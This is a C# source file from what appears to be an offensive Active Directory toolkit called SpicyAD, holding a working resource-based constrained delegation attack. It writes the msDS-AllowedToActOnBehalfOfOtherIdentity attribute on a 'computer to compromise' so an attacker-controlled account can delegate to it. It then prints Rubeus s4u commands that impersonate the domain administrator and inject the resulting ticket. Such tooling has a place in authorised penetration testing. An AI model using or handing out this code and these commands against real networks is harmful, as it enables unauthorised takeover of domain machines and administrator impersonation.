using System;
using System.DirectoryServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace SpicyAD
{
    public static class RBCDAttack
    {
        
        /// Interactive menu for RBCD attacks
        
        public static void RBCDInteractive()
        {
            Console.WriteLine("[*] Resource-Based Constrained Delegation (RBCD) Configuration\n");
            Console.WriteLine("[1] Set RBCD - Allow an account to delegate to target");
            Console.WriteLine("[2] Clear RBCD - Remove delegation configuration");
            Console.WriteLine("[3] Get RBCD - View current RBCD configuration");
            Console.WriteLine("[0] Back");
            Console.Write("\nSelect an option: ");

            string choice = Console.ReadLine()?.Trim();
            Console.WriteLine();

            switch (choice)
            {
                case "1":
                    SetRBCDInteractive();
                    break;
                case "2":
                    ClearRBCDInteractive();
                    break;
                case "3":
                    GetRBCDInteractive();
                    break;
                case "0":
                    return;
                default:
                    Console.WriteLine("[!] Invalid option");
                    break;
            }
        }

        
        /// Interactive mode to set RBCD
        
        private static void SetRBCDInteractive()
        {
            Console.WriteLine("[*] Set RBCD - Configure delegation\n");

            Console.Write("Enter target computer (the computer to compromise): ");
            string targetComputer = Console.ReadLine()?.Trim();

            Console.Write("Enter controlled account (machine account that will delegate): ");
            string controlledAccount = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(targetComputer) || string.IsNullOrEmpty(controlledAccount))
            {
                Console.WriteLine("[!] Both target and controlled account are required.");
                return;
            }

            SetRBCD(targetComputer, controlledAccount);
        }

        
        /// Interactive mode to clear RBCD
        
        private static void ClearRBCDInteractive()
        {
            Console.WriteLine("[*] Clear RBCD - Remove delegation configuration\n");

            Console.Write("Enter target computer to clear RBCD from: ");
            string targetComputer = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(targetComputer))
            {
                Console.WriteLine("[!] Target computer is required.");
                return;
            }

            ClearRBCD(targetComputer);
        }

        
        /// Interactive mode to get RBCD config
        
        private static void GetRBCDInteractive()
        {
            Console.WriteLine("[*] Get RBCD - View current configuration\n");

            Console.Write("Enter target computer: ");
            string targetComputer = Console.ReadLine()?.Trim();

            if (string.IsNullOrEmpty(targetComputer))
            {
                Console.WriteLine("[!] Target computer is required.");
                return;
            }

            GetRBCD(targetComputer);
        }

        
        /// Set RBCD on target computer to allow controlled account to delegate
        
        public static void SetRBCD(string targetComputer, string controlledAccount)
        {
            Console.WriteLine($"[*] Setting RBCD on {targetComputer}");
            Console.WriteLine($"[*] Allowing {controlledAccount} to delegate to {targetComputer}\n");

            try
            {
                // Normalize computer names (remove $ if present for search)
                string targetSearch = targetComputer.TrimEnd('$');
                string controlledSearch = controlledAccount.TrimEnd('$');

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);

                // Find target computer
                searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}$))";
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PropertiesToLoad.Add("samAccountName");
                SearchResult targetResult = searcher.FindOne();

                if (targetResult == null)
                {
                    // Try without $ suffix
                    searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}))";
                    targetResult = searcher.FindOne();
                }

                if (targetResult == null)
                {
                    Console.WriteLine($"[!] Target computer {targetComputer} not found.");
                    return;
                }

                string targetDN = targetResult.Properties["distinguishedName"][0].ToString();
                Console.WriteLine($"[+] Found target: {targetDN}");

                // Find controlled account (can be computer or user)
                searcher.Filter = $"(samAccountName={controlledSearch}$)";
                searcher.PropertiesToLoad.Add("objectSid");
                searcher.PropertiesToLoad.Add("samAccountName");
                SearchResult controlledResult = searcher.FindOne();

                if (controlledResult == null)
                {
                    // Try without $ suffix
                    searcher.Filter = $"(samAccountName={controlledSearch})";
                    controlledResult = searcher.FindOne();
                }

                if (controlledResult == null)
                {
                    Console.WriteLine($"[!] Controlled account {controlledAccount} not found.");
                    return;
                }

                byte[] sidBytes = (byte[])controlledResult.Properties["objectSid"][0];
                SecurityIdentifier controlledSid = new SecurityIdentifier(sidBytes, 0);
                Console.WriteLine($"[+] Found controlled account SID: {controlledSid}");

                // Create the security descriptor
                // Owner and Group are set to the controlled account
                RawSecurityDescriptor sd = new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, controlledSid, controlledSid, null, null);

                // Create DACL with GenericAll (0x10000000) for the controlled account
                sd.DiscretionaryAcl = new RawAcl(RawAcl.AclRevision, 1);
                sd.DiscretionaryAcl.InsertAce(0, new CommonAce(
                    AceFlags.None,
                    AceQualifier.AccessAllowed,
                    0x10000000, // GENERIC_ALL
                    controlledSid,
                    false,
                    null
                ));

                // Convert to bytes
                byte[] sdBytes = new byte[sd.BinaryLength];
                sd.GetBinaryForm(sdBytes, 0);

                // Write to target
                DirectoryEntry targetEntry = AuthContext.GetDirectoryEntry($"LDAP://{targetDN}");
                targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Value = sdBytes;
                targetEntry.CommitChanges();

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n[+] RBCD configured successfully!");
                Console.WriteLine($"[+] {controlledAccount} can now delegate to {targetComputer}");
                Console.ResetColor();

                // Build target FQDN
                string targetFqdn = targetComputer.TrimEnd('$');
                if (!targetFqdn.Contains(".") && !string.IsNullOrEmpty(AuthContext.DomainName))
                    targetFqdn = $"{targetFqdn}.{AuthContext.DomainName}";

                string dcParam = !string.IsNullOrEmpty(AuthContext.DcIp) ? $" /dc:{AuthContext.DcIp}" : "";

                Console.WriteLine("\n[*] Next steps with Rubeus:");
                Console.WriteLine($"\n    # Option 1: Using password");
                Console.WriteLine($"    Rubeus.exe hash /password:<password> /user:{controlledAccount} /domain:{AuthContext.DomainName}");
                Console.WriteLine($"    Rubeus.exe s4u /user:{controlledAccount} /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/{targetFqdn} /domain:{AuthContext.DomainName}{dcParam} /ptt");
                Console.WriteLine($"\n    # Option 2: Using AES256 key (more OPSEC)");
                Console.WriteLine($"    Rubeus.exe s4u /user:{controlledAccount} /aes256:<key> /impersonateuser:administrator /msdsspn:cifs/{targetFqdn} /domain:{AuthContext.DomainName}{dcParam} /ptt");
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied. You don't have permission to modify this computer's RBCD attribute.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error setting RBCD: {ex.Message}");
                OutputHelper.Verbose($"[!] Details: {ex}");
            }
        }

        
        /// Clear RBCD configuration from target computer
        
        public static void ClearRBCD(string targetComputer)
        {
            Console.WriteLine($"[*] Clearing RBCD from {targetComputer}\n");

            try
            {
                string targetSearch = targetComputer.TrimEnd('$');

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);

                // Find target computer
                searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}$))";
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity");
                SearchResult targetResult = searcher.FindOne();

                if (targetResult == null)
                {
                    searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}))";
                    targetResult = searcher.FindOne();
                }

                if (targetResult == null)
                {
                    Console.WriteLine($"[!] Target computer {targetComputer} not found.");
                    return;
                }

                string targetDN = targetResult.Properties["distinguishedName"][0].ToString();

                // Check if RBCD is configured
                if (!targetResult.Properties.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity") ||
                    targetResult.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Count == 0)
                {
                    Console.WriteLine($"[*] No RBCD configuration found on {targetComputer}.");
                    return;
                }

                // Show current config before clearing
                Console.WriteLine("[*] Current RBCD configuration:");
                GetRBCDFromResult(targetResult);

                Console.Write("\n[?] Are you sure you want to clear RBCD? (y/n): ");
                string confirm = Console.ReadLine()?.Trim().ToLower();

                if (confirm != "y" && confirm != "yes")
                {
                    Console.WriteLine("[*] Operation cancelled.");
                    return;
                }

                // Clear the attribute
                DirectoryEntry targetEntry = AuthContext.GetDirectoryEntry($"LDAP://{targetDN}");
                targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Clear();
                targetEntry.CommitChanges();

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"\n[+] RBCD cleared successfully from {targetComputer}");
                Console.ResetColor();
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied. You don't have permission to modify this computer's RBCD attribute.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error clearing RBCD: {ex.Message}");
                OutputHelper.Verbose($"[!] Details: {ex}");
            }
        }

        
        /// Clear RBCD without confirmation (for CLI)
        
        public static void ClearRBCD(string targetComputer, bool force)
        {
            if (!force)
            {
                ClearRBCD(targetComputer);
                return;
            }

            Console.WriteLine($"[*] Clearing RBCD from {targetComputer}\n");

            try
            {
                string targetSearch = targetComputer.TrimEnd('$');

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);

                searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}$))";
                searcher.PropertiesToLoad.Add("distinguishedName");
                SearchResult targetResult = searcher.FindOne();

                if (targetResult == null)
                {
                    searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}))";
                    targetResult = searcher.FindOne();
                }

                if (targetResult == null)
                {
                    Console.WriteLine($"[!] Target computer {targetComputer} not found.");
                    return;
                }

                string targetDN = targetResult.Properties["distinguishedName"][0].ToString();

                DirectoryEntry targetEntry = AuthContext.GetDirectoryEntry($"LDAP://{targetDN}");
                targetEntry.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Clear();
                targetEntry.CommitChanges();

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] RBCD cleared successfully from {targetComputer}");
                Console.ResetColor();
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[!] Access denied. You don't have permission to modify this computer's RBCD attribute.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error clearing RBCD: {ex.Message}");
            }
        }

        
        /// Get RBCD configuration for a specific computer
        
        public static void GetRBCD(string targetComputer)
        {
            Console.WriteLine($"[*] Getting RBCD configuration for {targetComputer}\n");

            try
            {
                string targetSearch = targetComputer.TrimEnd('$');

                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);

                searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}$))";
                searcher.PropertiesToLoad.Add("distinguishedName");
                searcher.PropertiesToLoad.Add("samAccountName");
                searcher.PropertiesToLoad.Add("dNSHostName");
                searcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity");
                SearchResult targetResult = searcher.FindOne();

                if (targetResult == null)
                {
                    searcher.Filter = $"(&(objectClass=computer)(samAccountName={targetSearch}))";
                    targetResult = searcher.FindOne();
                }

                if (targetResult == null)
                {
                    Console.WriteLine($"[!] Target computer {targetComputer} not found.");
                    return;
                }

                string samName = targetResult.Properties["samAccountName"].Count > 0 ?
                    targetResult.Properties["samAccountName"][0].ToString() : targetComputer;
                string dnsName = targetResult.Properties["dNSHostName"].Count > 0 ?
                    targetResult.Properties["dNSHostName"][0].ToString() : "N/A";

                Console.WriteLine($"[+] Computer: {samName}");
                Console.WriteLine($"    DNS Name: {dnsName}");

                if (!targetResult.Properties.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity") ||
                    targetResult.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"].Count == 0)
                {
                    Console.WriteLine("\n[*] No RBCD configuration found (msDS-AllowedToActOnBehalfOfOtherIdentity is empty)");
                    return;
                }

                GetRBCDFromResult(targetResult);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error getting RBCD: {ex.Message}");
            }
        }

        
        /// Parse and display RBCD configuration from search result
        
        private static void GetRBCDFromResult(SearchResult result)
        {
            try
            {
                byte[] sdBytes = (byte[])result.Properties["msDS-AllowedToActOnBehalfOfOtherIdentity"][0];
                RawSecurityDescriptor sd = new RawSecurityDescriptor(sdBytes, 0);

                Console.WriteLine("\n[+] Accounts allowed to delegate TO this computer:");

                if (sd.DiscretionaryAcl == null || sd.DiscretionaryAcl.Count == 0)
                {
                    Console.WriteLine("    (empty DACL)");
                    return;
                }

                foreach (var ace in sd.DiscretionaryAcl)
                {
                    var accessAce = ace as CommonAce;
                    if (accessAce != null)
                    {
                        string sidStr = accessAce.SecurityIdentifier.ToString();
                        string accountName = ResolveAccountName(accessAce.SecurityIdentifier);

                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"    [!] {accountName}");
                        Console.ResetColor();
                        Console.WriteLine($"        SID: {sidStr}");
                        Console.WriteLine($"        Access: 0x{accessAce.AccessMask:X8}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Could not parse RBCD descriptor: {ex.Message}");
            }
        }

        
        /// Resolve SID to account name
        
        private static string ResolveAccountName(SecurityIdentifier sid)
        {
            try
            {
                NTAccount account = (NTAccount)sid.Translate(typeof(NTAccount));
                return account.Value;
            }
            catch
            {
                return sid.ToString();
            }
        }
    }
}
